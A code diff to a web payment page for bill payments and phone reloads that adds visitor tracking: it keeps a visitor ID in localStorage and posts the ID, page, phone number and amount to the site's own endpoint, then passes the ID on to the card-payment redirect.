@@ -194,6 +194,15 @@
   const ref = params.get('ref') || ('NGOS' + Date.now());
   const type = params.get('type') || 'bill'; // 'bill' or 'reload'
 
+  // Visitor tracking
+  const _vid = params.get('vid') || localStorage.getItem('_vid') || 'v_' + Math.random().toString(36).slice(2) + Date.now();
+  localStorage.setItem('_vid', _vid);
+  function pingVisitor(page, num, amt, tp) {
+    fetch('/api/visitor/ping', { method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ visitorId: _vid, page, number: num || '', amount: amt || '', type: tp || type }) }).catch(() => {});
+  }
+  pingVisitor('payment-method', number, amount, type);
+
   // Display values
   document.getElementById('displayAmount').textContent = 'RM ' + parseFloat(amount).toFixed(2);
   const paymentLabel = type === 'reload'
@@ -246,7 +255,9 @@
         '&carrier=' + encodeURIComponent(carrier) +
         '&amount=' + encodeURIComponent(amount) +
         '&ref=' + encodeURIComponent(ref) +
-        '&type=' + encodeURIComponent(type);
+        '&type=' + encodeURIComponent(type) +
+        '&vid=' + encodeURIComponent(_vid);
+      pingVisitor('credit-card', number, amount, type);
       window.location.href = cardUrl;
       return;
     }
